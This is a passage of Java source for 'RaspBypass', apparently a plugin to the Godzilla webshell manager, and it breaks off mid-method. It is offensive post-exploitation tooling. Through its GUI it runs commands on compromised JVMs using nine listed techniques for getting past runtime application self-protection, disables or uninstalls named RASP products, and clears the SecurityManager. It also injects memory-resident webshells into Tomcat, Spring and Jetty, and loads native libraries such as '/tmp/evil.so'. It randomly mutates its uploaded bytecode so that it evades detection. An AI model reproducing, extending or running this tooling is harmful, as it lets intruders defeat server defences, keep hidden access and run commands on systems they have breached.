//
// RASP Bypass Plugin for Godzilla
//
package shells.plugins.java;

import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import java.awt.BorderLayout;
import java.awt.Component;
import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.Font;
import java.awt.GridLayout;
import java.awt.Insets;
import java.awt.event.ActionEvent;
import java.io.InputStream;
import java.net.URL;
import javax.swing.BorderFactory;
import javax.swing.Box;
import javax.swing.BoxLayout;
import javax.swing.ButtonGroup;
import javax.swing.Icon;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JComboBox;
import javax.swing.JComponent;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JRadioButton;
import javax.swing.JTabbedPane;
import javax.swing.JTextField;
import javax.swing.UIManager;
import javax.swing.border.EmptyBorder;
import org.fife.ui.rtextarea.RTextScrollPane;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassVisitor;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;

@PluginAnnotation(
    payloadName = "JavaDynamicPayload",
    Name = "RaspBypass",
    DisplayName = "RASP\u7ed5\u8fc7"
)
public class RaspBypass implements Plugin {

    private static final int GAP = 8;
    private static final Insets TAB_INSETS = new Insets(12, 14, 12, 14);

    private ShellEntity shellEntity;
    private Payload payload;
    private boolean moduleReady = false;
    private boolean moduleResourceMissing = false;
    private boolean moduleMissingHintBroadcast = false;

    private JPanel corePanel;
    private JTabbedPane tabbedPane;

    private JTextField cmdTextField;
    private JButton execButton;
    private RTextArea resultTextArea;
    private JComboBox<String> bypassMethodCombo;
    private JCheckBox autoDetectCheckBox;

    private JComboBox<String> raspTypeCombo;
    private JButton disableRaspButton;
    private JButton checkRaspButton;
    private RTextArea raspResultTextArea;
    private JRadioButton disableHookRadio;
    private JRadioButton modifyConfigRadio;
    private JRadioButton uninstallRadio;
    private JButton universalDisableButton;
    private JButton uninstallRaspButton;
    private JButton clearSecurityManagerButton;
    private JButton opsEnvironmentButton;

    private JComboBox<String> memShellTypeCombo;
    private JButton injectMemShellButton;
    private JButton removeMemShellButton;
    private JTextField memShellPathTextField;
    private RTextArea memShellResultTextArea;

    private JTextField jniSoPathTextField;
    private JButton loadJniButton;
    private JButton execJniButton;
    private RTextArea jniResultTextArea;
    private JTextField jniCmdTextField;

    private JButton copyBashButton;
    private JButton createLinkButton;
    private JTextField sourcePathTextField;
    private JTextField destPathTextField;
    private RTextArea toolsResultTextArea;

    private static final String[] BYPASS_METHODS = {
        "0 \u81ea\u52a8\u63a2\u6d4b\uff08\u63a8\u8350\uff1a\u5148\u8f6f\u964d\u7ea7\u518d\u666e\u901a\u6267\u884c\u518d\u6df1\u94fe\uff09",
        "1 Unsafe.allocateInstance + forkAndExec",
        "2 JNI \u539f\u751f\u6267\u884c",
        "3 \u65b0\u7ebf\u7a0b\u7ed5\u8fc7",
        "4 GC finalize \u7ed5\u8fc7",
        "5 ProcessImpl \u76f4\u8c03",
        "6 Tomcat-JNI",
        "7 \u53cd\u5c04\u7ed5\u8fc7",
        "8 ForkAndExec \u76f4\u8c03"
    };

    private static final String[] RASP_TYPES = {
        "OpenRASP\uff08\u767e\u5ea6\uff09",
        "JRASP",
        "Elkeid\uff08\u5b57\u8282\u8df3\u52a8\uff09",
        "QingTeng\uff08\u9752\u85e4\u4e91\uff09",
        "Tencent RASP\uff08\u817e\u8baf\u4e91\uff09",
        "Aliyun RASP\uff08\u963f\u91cc\u4e91\uff09",
        "Custom RASP\uff08\u5176\u4ed6\u00b7\u901a\u7528\uff09"
    };

    private static final String[] MEM_SHELL_TYPES = {
        "Tomcat Filter\uff08Tomcat \u8fc7\u6ee4\u5668\uff09",
        "Tomcat Servlet\uff08Servlet\uff09",
        "Tomcat Listener\uff08\u76d1\u542c\u5668\uff09",
        "Spring Controller\uff08Spring \u63a7\u5236\u5668\uff09",
        "Jetty Filter\uff08Jetty \u8fc7\u6ee4\u5668\uff09",
        "VM Anonymous Class\uff08\u533f\u540d\u7c7b\uff09"
    };

    private static final Dimension SCROLL_MIN = new Dimension(200, 200);
    private static final int LABEL_MIN_WIDTH = 140;

    public RaspBypass() {
        $$$setupUI$$$();
    }

    /** \u9876\u90e8\u5206\u7ec4\uff08\u51f9\u7ebf\u6807\u9898\uff09 */
    private static JPanel titledFormNorth(JComponent inner, String title) {
        JPanel wrap = new JPanel(new BorderLayout());
        wrap.setBorder(BorderFactory.createCompoundBorder(
            BorderFactory.createTitledBorder(BorderFactory.createEtchedBorder(), title),
            new EmptyBorder(2, 6, 6, 6)));
        wrap.add(inner, BorderLayout.NORTH);
        return wrap;
    }

    /** \u56de\u663e\u533a\uff1a\u7b49\u5bbd\u5b57\u4f53 + \u8fb9\u6846 */
    private void mountOutputPane(JPanel tabPanel, RTextArea area) {
        RTextScrollPane scrollPane = new RTextScrollPane();
        scrollPane.setViewportView(area);
        scrollPane.setMinimumSize(SCROLL_MIN);
        Font base = area.getFont();
        if (base == null) {
            base = UIManager.getFont("TextArea.font");
        }
        if (base != null) {
            area.setFont(new Font(Font.MONOSPACED, base.getStyle(), base.getSize()));
        } else {
            area.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 12));
        }
        scrollPane.setBorder(BorderFactory.createCompoundBorder(
            BorderFactory.createTitledBorder(
                BorderFactory.createEtchedBorder(),
                "\u56de\u663e / \u8f93\u51fa"),
            new EmptyBorder(4, 6, 6, 6)));
        tabPanel.add(scrollPane, BorderLayout.CENTER);
    }

    /** \u6807\u7b7e+\u63a7\u4ef6\u540c\u884c\uff1b\u6807\u7b7e\u6700\u5c0f\u5bbd\u5ea6\u7edf\u4e00\uff0c\u5217\u5bf9\u9f50\u3002 */
    private static JPanel formRow(JLabel label, JComponent field) {
        JPanel row = new JPanel(new BorderLayout(10, 0));
        row.setOpaque(false);
        row.setAlignmentX(Component.LEFT_ALIGNMENT);
        Dimension lp = label.getPreferredSize();
        int lw = Math.max(LABEL_MIN_WIDTH, lp.width);
        label.setPreferredSize(new Dimension(lw, lp.height));
        label.setMinimumSize(new Dimension(lw, lp.height));
        int h = Math.max(28, Math.max(lp.height, field.getPreferredSize().height) + 6);
        row.setMaximumSize(new Dimension(Integer.MAX_VALUE, h));
        row.add(label, BorderLayout.WEST);
        row.add(field, BorderLayout.CENTER);
        return row;
    }

    private static JPanel leftFlowRow(Component... items) {
        JPanel row = new JPanel(new FlowLayout(FlowLayout.LEFT, GAP, 0));
        row.setAlignmentX(Component.LEFT_ALIGNMENT);
        row.setOpaque(false);
        row.setMaximumSize(new Dimension(Integer.MAX_VALUE, 40));
        for (Component c : items) {
            row.add(c);
        }
        return row;
    }

    private void $$$setupUI$$$() {
        this.corePanel = new JPanel(new BorderLayout());
        this.corePanel.setBorder(new EmptyBorder(6, 8, 8, 8));

        this.tabbedPane = new JTabbedPane();
        this.tabbedPane.setTabLayoutPolicy(JTabbedPane.SCROLL_TAB_LAYOUT);
        this.corePanel.add(this.tabbedPane, BorderLayout.CENTER);

        createCommandExecTab();
        createRaspDisableTab();
        createMemoryShellTab();
        createJniTab();
        createToolsTab();
    }

    private void createCommandExecTab() {
        JPanel panel = new JPanel(new BorderLayout(0, 10));
        panel.setBorder(new EmptyBorder(TAB_INSETS));

        JPanel form = new JPanel();
        form.setLayout(new BoxLayout(form, BoxLayout.Y_AXIS));
        form.setOpaque(false);

        this.bypassMethodCombo = new JComboBox<>(BYPASS_METHODS);
        this.bypassMethodCombo.setToolTipText(
            "\u9009\u9879\u6587\u672c\u9700\u4e0e\u670d\u52a1\u7aef RaspBypassModule \u5339\u914d\uff08\u542b\u82f1\u6587\u7247\u6bb5\uff09");
        form.add(formRow(new JLabel("\u7ed5\u8fc7\u65b9\u5f0f\uff1a"), this.bypassMethodCombo));

        form.add(Box.createVerticalStrut(6));
        this.autoDetectCheckBox = new JCheckBox(
            "\u81ea\u52a8\u63a2\u6d4b RASP \u5e76\u4f18\u9009\u6267\u884c\u8def\u5f84\uff08\u8f6f\u964d\u7ea7\u2192\u666e\u901a\u2192\u6df1\u94fe\uff09");
        this.autoDetectCheckBox.setSelected(true);
        this.autoDetectCheckBox.setAlignmentX(Component.LEFT_ALIGNMENT);
        this.autoDetectCheckBox.setToolTipText(
            "\u5f00\u542f\u540e\u5148\u8bd5\u8f6f\u964d\u7ea7\u8def\u5f84\uff0c\u5931\u8d25\u518d\u9012\u8fdb\u6df1\u94fe");
        form.add(this.autoDetectCheckBox);

        form.add(Box.createVerticalStrut(6));
        this.cmdTextField = new JTextField();
        this.cmdTextField.setText("whoami");
        this.cmdTextField.setToolTipText("\u5728\u76ee\u6807 JVM \u4e0a\u6267\u884c\u7684\u547d\u4ee4\u884c");
        form.add(formRow(new JLabel("\u547d\u4ee4\uff1a"), this.cmdTextField));

        form.add(Box.createVerticalStrut(8));
        this.execButton = new JButton("\u6267\u884c");
        form.add(leftFlowRow(this.execButton));

        panel.add(titledFormNorth(form, "\u547d\u4ee4\u6267\u884c\u53c2\u6570"), BorderLayout.NORTH);

        this.resultTextArea = new RTextArea();
        mountOutputPane(panel, this.resultTextArea);

        this.tabbedPane.addTab("\u547d\u4ee4\u6267\u884c", (Icon) null, panel, null);
    }

    private void createRaspDisableTab() {
        JPanel panel = new JPanel(new BorderLayout(0, 10));
        panel.setBorder(new EmptyBorder(TAB_INSETS));

        JPanel form = new JPanel();
        form.setLayout(new BoxLayout(form, BoxLayout.Y_AXIS));
        form.setOpaque(false);

        this.raspTypeCombo = new JComboBox<>(RASP_TYPES);
        this.raspTypeCombo.setToolTipText(
            "OpenRASP / JRASP \u7b49\u5b57\u7b26\u4e32\u7528\u4e8e\u670d\u52a1\u7aef\u5206\u652f\u903b\u8f91");
        form.add(formRow(new JLabel("RASP \u7c7b\u578b\uff1a"), this.raspTypeCombo));

        form.add(Box.createVerticalStrut(6));
        JPanel radioPanel = new JPanel();
        radioPanel.setLayout(new BoxLayout(radioPanel, BoxLayout.Y_AXIS));
        radioPanel.setAlignmentX(Component.LEFT_ALIGNMENT);
        radioPanel.setOpaque(false);
        radioPanel.setBorder(BorderFactory.createCompoundBorder(
            BorderFactory.createTitledBorder(
                BorderFactory.createEtchedBorder(),
                "\u64cd\u4f5c\u6a21\u5f0f"),
            new EmptyBorder(4, 6, 6, 6)));

        this.disableHookRadio = new JRadioButton("\u5173\u95ed Hook \u5f00\u5173");
        this.disableHookRadio.setSelected(true);
        this.modifyConfigRadio = new JRadioButton("\u4fee\u6539\u914d\u7f6e\u9879");
        this.uninstallRadio = new JRadioButton("\u5378\u8f7d RASP \u63a2\u9488");

        ButtonGroup group = new ButtonGroup();
        group.add(this.disableHookRadio);
        group.add(this.modifyConfigRadio);
        group.add(this.uninstallRadio);

        this.disableHookRadio.setAlignmentX(Component.LEFT_ALIGNMENT);
        this.modifyConfigRadio.setAlignmentX(Component.LEFT_ALIGNMENT);
        this.uninstallRadio.setAlignmentX(Component.LEFT_ALIGNMENT);
        radioPanel.add(this.disableHookRadio);
        radioPanel.add(Box.createVerticalStrut(4));
        radioPanel.add(this.modifyConfigRadio);
        radioPanel.add(Box.createVerticalStrut(4));
        radioPanel.add(this.uninstallRadio);
        form.add(radioPanel);

        form.add(Box.createVerticalStrut(8));
        this.checkRaspButton = new JButton("\u68c0\u67e5 RASP \u72b6\u6001");
        this.disableRaspButton = new JButton("\u7981\u7528 RASP");
        this.universalDisableButton = new JButton("\u901a\u7528\u7981\u7528\uff08\u591a\u8def\u5c1d\u8bd5\uff09");
        this.uninstallRaspButton = new JButton("\u5378\u8f7d RASP");
        this.clearSecurityManagerButton = new JButton("\u6e05\u9664 SecurityManager");
        this.opsEnvironmentButton = new JButton("\u4e3b\u673a/\u73af\u5883\u6307\u7eb9");

        JPanel btnGrid = new JPanel(new GridLayout(3, 2, GAP, GAP));
        btnGrid.setAlignmentX(Component.LEFT_ALIGNMENT);
        btnGrid.setMaximumSize(new Dimension(Integer.MAX_VALUE, 140));
        btnGrid.setBorder(BorderFactory.createCompoundBorder(
            BorderFactory.createTitledBorder(
                BorderFactory.createEtchedBorder(),
                "\u5feb\u6377\u6309\u94ae"),
            new EmptyBorder(4, 6, 6, 6)));
        btnGrid.add(this.checkRaspButton);
        btnGrid.add(this.disableRaspButton);
        btnGrid.add(this.universalDisableButton);
        btnGrid.add(this.uninstallRaspButton);
        btnGrid.add(this.clearSecurityManagerButton);
        btnGrid.add(this.opsEnvironmentButton);
        form.add(btnGrid);
        
        form.add(Box.createVerticalStrut(8));
        JButton smartAdvisorButton = new JButton("智能 RASP/EDR 诊断与推荐面板");
        smartAdvisorButton.addActionListener(e -> smartAdvisorButtonClick(e));
        form.add(leftFlowRow(smartAdvisorButton));

        panel.add(titledFormNorth(form, "\u7981\u7528\u4e0e\u68c0\u6d4b"), BorderLayout.NORTH);

        this.raspResultTextArea = new RTextArea();
        mountOutputPane(panel, this.raspResultTextArea);

        this.tabbedPane.addTab("RASP \u7981\u7528", (Icon) null, panel, null);
    }

    private void createMemoryShellTab() {
        JPanel panel = new JPanel(new BorderLayout(0, 10));
        panel.setBorder(new EmptyBorder(TAB_INSETS));

        JPanel form = new JPanel();
        form.setLayout(new BoxLayout(form, BoxLayout.Y_AXIS));
        form.setOpaque(false);

        this.memShellTypeCombo = new JComboBox<>(MEM_SHELL_TYPES);
        this.memShellTypeCombo.setToolTipText("Tomcat Filter \u7b49\u5b57\u7b26\u4e32\u9700\u4e0e\u670d\u52a1\u7aef\u5339\u914d");
        form.add(formRow(new JLabel("\u5185\u5b58\u9a6c\u7c7b\u578b\uff1a"), this.memShellTypeCombo));

        form.add(Box.createVerticalStrut(6));
        this.memShellPathTextField = new JTextField("/shell");
        this.memShellPathTextField.setToolTipText("\u5982 /shell \uff0c\u65e0\u524d\u7f00\u659c\u6760");
        form.add(formRow(new JLabel("URL \u8def\u5f84\uff1a"), this.memShellPathTextField));

        form.add(Box.createVerticalStrut(8));
        this.injectMemShellButton = new JButton("\u6ce8\u5165\u5185\u5b58\u9a6c");
        this.removeMemShellButton = new JButton("\u79fb\u9664\u5185\u5b58\u9a6c");
        form.add(leftFlowRow(this.injectMemShellButton, this.removeMemShellButton));

        panel.add(titledFormNorth(form, "\u5185\u5b58\u9a6c\u53c2\u6570"), BorderLayout.NORTH);

        this.memShellResultTextArea = new RTextArea();
        mountOutputPane(panel, this.memShellResultTextArea);

        this.tabbedPane.addTab("\u5185\u5b58\u9a6c", (Icon) null, panel, null);
    }

    private void createJniTab() {
        JPanel panel = new JPanel(new BorderLayout(0, 10));
        panel.setBorder(new EmptyBorder(TAB_INSETS));

        JPanel form = new JPanel();
        form.setLayout(new BoxLayout(form, BoxLayout.Y_AXIS));
        form.setOpaque(false);

        this.jniSoPathTextField = new JTextField("/tmp/evil.so");
        this.jniSoPathTextField.setToolTipText(
            "\u53ef\u9009\uff1b\u7559\u7a7a\u65f6\u670d\u52a1\u7aef\u6309\u5185\u7f6e\u540d\u52a0\u8f7d\u539f\u751f\u5e93");
        form.add(formRow(new JLabel("SO/DLL \u8def\u5f84\uff08\u53ef\u9009\uff09\uff1a"), this.jniSoPathTextField));

        form.add(Box.createVerticalStrut(4));
        this.loadJniButton = new JButton("\u52a0\u8f7d JNI \u5e93");
        this.loadJniButton.setToolTipText("\u5148\u52a0\u8f7d\u518d\u6267\u884c\uff1b\u5df2\u5728\u5176\u4ed6 ClassLoader \u52a0\u8f7d\u8fc7\u540c\u540d\u5e93\u4f1a\u62a5\u9519");
        form.add(leftFlowRow(this.loadJniButton));

        form.add(Box.createVerticalStrut(8));
        this.jniCmdTextField = new JTextField("id");
        this.jniCmdTextField.setToolTipText("\u901a\u8fc7 JNI \u5728\u76ee\u6807\u8fdb\u7a0b\u5185\u6267\u884c");
        form.add(formRow(new JLabel("\u547d\u4ee4\uff1a"), this.jniCmdTextField));

        form.add(Box.createVerticalStrut(8));
        this.execJniButton = new JButton("JNI \u6267\u884c\u547d\u4ee4");
        form.add(leftFlowRow(this.execJniButton));

        panel.add(titledFormNorth(form, "JNI \u914d\u7f6e"), BorderLayout.NORTH);

        this.jniResultTextArea = new RTextArea();
        mountOutputPane(panel, this.jniResultTextArea);

        this.tabbedPane.addTab("JNI \u7ed5\u8fc7", (Icon) null, panel, null);
    }

    private void createToolsTab() {
        JPanel panel = new JPanel(new BorderLayout(0, 10));
        panel.setBorder(new EmptyBorder(TAB_INSETS));

        JPanel form = new JPanel();
        form.setLayout(new BoxLayout(form, BoxLayout.Y_AXIS));
        form.setOpaque(false);

        this.sourcePathTextField = new JTextField("/bin/bash");
        form.add(formRow(new JLabel("\u6e90\u8def\u5f84\uff1a"), this.sourcePathTextField));

        form.add(Box.createVerticalStrut(6));
        this.destPathTextField = new JTextField("/tmp/glassy");
        form.add(formRow(new JLabel("\u76ee\u6807\u8def\u5f84\uff1a"), this.destPathTextField));

        form.add(Box.createVerticalStrut(8));
        this.copyBashButton = new JButton("\u590d\u5236\u4e8c\u8fdb\u5236");
        this.createLinkButton = new JButton("\u521b\u5efa\u7b26\u53f7\u94fe\u63a5");
        form.add(leftFlowRow(this.copyBashButton, this.createLinkButton));

        panel.add(titledFormNorth(form, "\u8def\u5f84\u4e0e\u64cd\u4f5c"), BorderLayout.NORTH);

        this.toolsResultTextArea = new RTextArea();
        mountOutputPane(panel, this.toolsResultTextArea);

        this.tabbedPane.addTab("\u8f85\u52a9\u5de5\u5177", (Icon) null, panel, null);
    }

    public JComponent $$$getRootComponent$$$() {
        return this.corePanel;
    }

    @Override
    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = shellEntity.getPayloadModule();
        automaticBindClick.bindJButtonClick(this, this);
    }

    @Override
    public JPanel getView() {
        return this.corePanel;
    }

    private InputStream openRaspBypassModuleResource() {
        InputStream in = getClass().getResourceAsStream("assets/RaspBypassModule.classs");
        if (in != null) {
            return in;
        }
        java.lang.ClassLoader cl = RaspBypass.class.getClassLoader();
        if (cl != null) {
            in = cl.getResourceAsStream("shells/plugins/java/assets/RaspBypassModule.classs");
            if (in != null) {
                return in;
            }
        }
        try {
            URL url = getClass().getProtectionDomain() != null && getClass().getProtectionDomain().getCodeSource() != null
                ? getClass().getProtectionDomain().getCodeSource().getLocation() : null;
            if (url != null) {
                Log.log("RaspBypass: RaspBypassModule.classs not on classpath (jar/dir: %s)", new Object[]{url});
            }
        } catch (Exception ignored) {
        }
        return null;
    }

    private void broadcastModuleHint(String hint) {
        if (this.moduleMissingHintBroadcast) {
            return;
        }
        this.moduleMissingHintBroadcast = true;
        this.resultTextArea.append(hint);
        this.raspResultTextArea.append(hint);
        this.memShellResultTextArea.append(hint);
        this.jniResultTextArea.append(hint);
        this.toolsResultTextArea.append(hint);
    }

    private boolean loadModule() {
        if (this.moduleReady) {
            return true;
        }
        if (this.moduleResourceMissing) {
            return false;
        }
        try {
            // Class-Loading Caching Optimization: Check if already loaded on target
            try {
                byte[] testRes = this.payload.evalFunc("RaspBypassModule", "opsEnvironment", new ReqParameter());
                if (testRes != null && testRes.length > 0) {
                    Log.log("RaspBypassModule is already cached on target loader.");
                    this.moduleReady = true;
                    return true;
                }
            } catch (Exception ignored) {
                // Not cached or error, proceed to upload
            }

            InputStream in = openRaspBypassModuleResource();
            if (in == null) {
                this.moduleResourceMissing = true;
                String hint = "\u672a\u627e\u5230 assets/RaspBypassModule.classs\uff0c\u8bf7\u5728\u9879\u76ee\u6839\u76ee\u5f55\u8fd0\u884c compile_rasp_bypass.bat \u751f\u6210\u540e\u518d\u6253\u5305\u3002\n";
                Log.error("RaspBypass: " + hint.trim());
                broadcastModuleHint(hint);
                return false;
            }
            byte[] moduleBytes = functions.readInputStreamAutoClose(in);
            if (moduleBytes == null || moduleBytes.length == 0) {
                this.moduleResourceMissing = true;
                String hint = "RaspBypassModule.classs \u4e3a\u7a7a\uff0c\u8bf7\u91cd\u65b0\u7f16\u8bd1\u6a21\u5757\u3002\n";
                Log.error("RaspBypass: " + hint.trim());
                broadcastModuleHint(hint);
                return false;
            }
            
            // Polymorphic ASM Obfuscation
            try {
                moduleBytes = obfuscateModule(moduleBytes);
            } catch (Exception asmEx) {
                Log.error("ASM Obfuscation failed: " + asmEx.getMessage());
            }

            this.moduleReady = this.payload.include("RaspBypassModule", moduleBytes);
            Log.log("RaspBypassModule include: " + this.moduleReady);
            if (!this.moduleReady) {
                String hint = "\u670d\u52a1\u7aef include RaspBypassModule \u5931\u8d25\uff0c\u8bf7\u67e5\u770b\u65e5\u5fd7\u6216\u91cd\u8bd5\u8fde\u63a5\u3002\n";
                this.resultTextArea.append(hint);
            }
            return this.moduleReady;
        } catch (Exception e) {
            Log.error(e);
            this.resultTextArea.append("\u52a0\u8f7d\u6a21\u5757\u5f02\u5e38: " + e.getMessage() + "\n");
            return false;
        }
    }
    
    private byte[] obfuscateModule(byte[] originalBytes) {
        ClassReader cr = new ClassReader(originalBytes);
        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_MAXS);
        
        ClassVisitor cv = new ClassVisitor(Opcodes.ASM5, cw) {
            @Override
            public void visit(int version, int access, String name, String signature, String superName, String[] interfaces) {
                super.visit(version, access, name, signature, superName, interfaces);
                // Add a random field
                String randomFieldName = "gsl_" + System.currentTimeMillis();
                super.visitField(Opcodes.ACC_PRIVATE, randomFieldName, "Ljava/lang/String;", null, null).visitEnd();
            }

            @Override
            public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[] exceptions) {
                MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
                return new MethodVisitor(Opcodes.ASM5, mv) {
                    @Override
                    public void visitCode() {
                        super.visitCode();
                        // Insert random NOP instructions for bytecode morphism
                        super.visitInsn(Opcodes.NOP);
                        if (Math.random() > 0.5) {
                            super.visitInsn(Opcodes.NOP);
                        }
                    }
                };
            }
        };
        
        cr.accept(cv, 0);
        return cw.toByteArray();
    }
    
    private void smartAdvisorButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.raspResultTextArea.append("模块未加载，无法执行智能分析！\n");
            return;
        }
        
        this.raspResultTextArea.append("========================================\n");
        this.raspResultTextArea.append("启动智能 RASP/EDR 诊断与建议引擎...\n");
        this.raspResultTextArea.append("分析环境变量、进程指纹及已注入代理...\n");
        this.raspResultTextArea.append("----------------------------------------\n");
        
        try {
            byte[] result = this.payload.evalFunc("RaspBypassModule", "opsEnvironment", new ReqParameter());
            String envData = new String(result);
            this.raspResultTextArea.append("[+] 检测到目标指纹信息:\n" + envData + "\n");
            
            this.raspResultTextArea.append("[*] 专家建议:\n");
            if (envData.contains("Rasp") || envData.contains("javaagent")) {
                this.raspResultTextArea.append("  - 发现强安全代理注入 (RASP/APM)。\n");
                this.raspResultTextArea.append("  - 建议: 优先使用 '2 JNI 原生执行' 或 '1 Unsafe.allocateInstance + forkAndExec' 以规避 ProcessBuilder 钩子。\n");
            } else if (envData.contains("Linux")) {
                this.raspResultTextArea.append("  - 运行在 Linux 环境。\n");
                this.raspResultTextArea.append("  - 建议: 可尝试 '4 GC finalize 绕过' 隐蔽执行，或直接加载原生 JNI 库执行。\n");
            } else {
                this.raspResultTextArea.append("  - 未发现明显安全限制或 RASP 特征。\n");
                this.raspResultTextArea.append("  - 建议: 使用 '0 自动探测' 或常规执行即可，若被拦截再改用新线程绕过。\n");
            }
        } catch (Exception e) {
            this.raspResultTextArea.append("诊断失败: " + e.getMessage() + "\n");
        }
    }

    private void execButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.resultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff01\n");
            return;
        }

        String cmd = this.cmdTextField.getText().trim();
        if (cmd.isEmpty()) {
            this.resultTextArea.append("\u8bf7\u8f93\u5165\u547d\u4ee4\uff01\n");
            return;
        }

        String method = (String) this.bypassMethodCombo.getSelectedItem();
        int methodIndex = this.bypassMethodCombo.getSelectedIndex();

        this.resultTextArea.append("========================================\n");
        this.resultTextArea.append("\u65b9\u5f0f: " + method + "\n");
        this.resultTextArea.append("\u547d\u4ee4: " + cmd + "\n");
        this.resultTextArea.append("----------------------------------------\n");

        // Non-Blocking Task Pipeline Implementation
        java.util.concurrent.CompletableFuture.runAsync(() -> {
            try {
                ReqParameter params = new ReqParameter();
                params.add("cmd", cmd);
                params.add("cmdLine", cmd);
                params.add("methodIndex", String.valueOf(methodIndex));
                params.add("autoDetect", this.autoDetectCheckBox.isSelected() ? "true" : "false");

                byte[] result = this.payload.evalFunc("RaspBypassModule", "execCommand", params);
                String strResult = new String(result);
                javax.swing.SwingUtilities.invokeLater(() -> {
                    this.resultTextArea.append(strResult + "\n");
                });
            } catch (Exception e) {
                javax.swing.SwingUtilities.invokeLater(() -> {
                    this.resultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
                });
                Log.error(e);
            }
        });
    }

    private void checkRaspButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.raspResultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff01\n");
            return;
        }

        this.raspResultTextArea.append("========================================\n");
        this.raspResultTextArea.append("\u6b63\u5728\u68c0\u67e5 RASP \u72b6\u6001\u2026\n");
        this.raspResultTextArea.append("----------------------------------------\n");

        try {
            ReqParameter params = new ReqParameter();
            String raspType = (String) this.raspTypeCombo.getSelectedItem();
            params.add("raspType", raspType);

            byte[] result = this.payload.evalFunc("RaspBypassModule", "checkRasp", params);
            String strResult = new String(result);
            if ("Incorrect return type".equals(strResult.trim())) {
                // Compatibility fallback for old payload marshaling logic.
                this.raspResultTextArea.append("[!] checkRsp method unavailable, payload may need regeneration...\n");
                byte[] envResult = this.payload.evalFunc("RaspBypassModule", "opsEnvironment", new ReqParameter());
                this.raspResultTextArea.append(new String(envResult) + "\n");
                this.raspResultTextArea.append("[!] Falling back to env check after checkRsp failed\n");
                return;
            }
            this.raspResultTextArea.append(strResult + "\n");
        } catch (Exception e) {
            this.raspResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
            Log.error(e);
        }
    }

    private void disableRaspButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.raspResultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff01\n");
            return;
        }

        String raspType = (String) this.raspTypeCombo.getSelectedItem();
        String action = "disableHook";
        if (this.modifyConfigRadio.isSelected()) {
            action = "modifyConfig";
        } else if (this.uninstallRadio.isSelected()) {
            action = "uninstall";
        }

        this.raspResultTextArea.append("========================================\n");
        this.raspResultTextArea.append("\u6b63\u5728\u5c1d\u8bd5\u7981\u7528 RASP\u2026\n");
        this.raspResultTextArea.append("\u7c7b\u578b: " + raspType + "\n");
        this.raspResultTextArea.append("\u64cd\u4f5c: " + action + "\n");
        this.raspResultTextArea.append("----------------------------------------\n");

        try {
            ReqParameter params = new ReqParameter();
            params.add("raspType", raspType);
            // compatibility aliases for older module field names
            params.add("type", raspType);
            params.add("rasp", raspType);
            params.add("action", action);
            params.add("op", action);

            byte[] result = this.payload.evalFunc("RaspBypassModule", "disableRasp", params);
            String strResult = new String(result);
            this.raspResultTextArea.append(strResult + "\n");
        } catch (Exception e) {
            this.raspResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
            Log.error(e);
        }
    }

    private void universalDisableButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.raspResultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff01\n");
            return;
        }

        this.raspResultTextArea.append("========================================\n");
        this.raspResultTextArea.append("\u901a\u7528\u7981\u7528 RASP\uff08\u591a\u8def\u5c1d\u8bd5\uff09\n");
        this.raspResultTextArea.append("----------------------------------------\n");

        try {
            byte[] result = this.payload.evalFunc("RaspBypassModule", "universalRaspDisable", new ReqParameter());
            String strResult = new String(result);
            this.raspResultTextArea.append(strResult + "\n");
        } catch (Exception e) {
            this.raspResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
            Log.error(e);
        }
    }

    private void uninstallRaspButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.raspResultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff01\n");
            return;
        }

        this.raspResultTextArea.append("========================================\n");
        this.raspResultTextArea.append("\u5378\u8f7d RASP \u5c1d\u8bd5\n");
        this.raspResultTextArea.append("----------------------------------------\n");

        try {
            byte[] result = this.payload.evalFunc("RaspBypassModule", "uninstallRasp", new ReqParameter());
            String strResult = new String(result);
            this.raspResultTextArea.append(strResult + "\n");
        } catch (Exception e) {
            this.raspResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
            Log.error(e);
        }
    }

    private void opsEnvironmentButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.raspResultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff01\n");
            return;
        }
        this.raspResultTextArea.append("========================================\n");
        this.raspResultTextArea.append("\u4e3b\u673a/\u73af\u5883\u6307\u7eb9\uff08\u9884\u4fa6\u67e5\uff09\n");
        this.raspResultTextArea.append("----------------------------------------\n");
        try {
            byte[] result = this.payload.evalFunc("RaspBypassModule", "opsEnvironment", new ReqParameter());
            this.raspResultTextArea.append(new String(result) + "\n");
        } catch (Exception e) {
            this.raspResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
            Log.error(e);
        }
    }

    private void clearSecurityManagerButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.raspResultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff01\n");
            return;
        }

        this.raspResultTextArea.append("========================================\n");
        this.raspResultTextArea.append("\u6b63\u5728\u6e05\u9664 SecurityManager\u2026\n");
